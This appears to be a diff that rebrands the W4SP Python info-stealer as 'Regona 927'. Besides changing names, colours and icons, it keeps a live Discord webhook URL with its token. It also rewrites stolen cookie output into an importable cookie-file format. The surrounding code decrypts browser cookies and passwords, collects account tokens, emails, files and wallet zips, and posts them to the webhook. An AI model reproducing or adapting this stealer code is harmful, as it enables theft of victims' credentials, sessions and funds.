@@ -15,11 +15,6 @@ import random
 import re
 import subprocess
 
-#  THIS IS 1.1.6 VERSION
-#    BY W4SP, loTus04
-# 
-
-
 hook = "https://discord.com/api/webhooks/1079829024219603025/Jtlv84R17kh6ZnsAn2fBxQABgIvQXOk-3K4OM6VzshVDyD-ukZVxAo7OmvO2L9FBzei_"
 DETECTED = False
 
@@ -288,11 +283,11 @@ def uploadToken(token, path):
         "content": f'{globalInfo()} | Found in `{path}`',
         "embeds": [
             {
-            "color": 14406413,
+            "color": 2895667,
             "fields": [
                 {
                     "name": ":rocket: Token:",
-                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
+                    "value": f"`{token}`"
                 },
                 {
                     "name": ":envelope: Email:",
@@ -330,16 +325,16 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@Regona 927",
+                "icon_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
-        "username": "W4SP Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg",
+        "username": "Regona 927",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -367,17 +362,17 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
-                    "color": 14406413,
+                    "title": "Regona | Cookie's",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [regoCookies.txt]({link})",
+                    "color": 2895667,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "@Regona 927",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "Regona",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -393,17 +388,17 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
-                    "color": 14406413,
+                    "title": "Regona | Password's",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [regoPassword.txt]({link})",
+                    "color": 2895667,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "@Regona 927",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "Regona 927",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -414,7 +409,7 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                "color": 14406413,
+                "color": 2895667,
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
@@ -422,16 +417,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "W4SP | File Stealer"
+                    "name": "Regona | File's"
                 },
                 "footer": {
-                    "text": "@W4SP STEALER",
-                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                    "text": "@Regona 927",
+                    "icon_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg"
                 }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "Regona 927",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -451,7 +446,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
+        f.write(f"<--Regona 927 ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -544,7 +539,7 @@ def getCookie(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
-            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
+            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
             CookiCount += 1
     writeforfile(Cookies, 'cook')
 
@@ -616,17 +611,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "W4SP Zips",
+            "title": "Regona Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@Regona 927",
+                "icon_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg"
             }
             }
         ],
-        "username": "W4SP Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+        "username": "Regona 927",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1079492661326663760/1079847598376112128/1677362095048.jpg",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
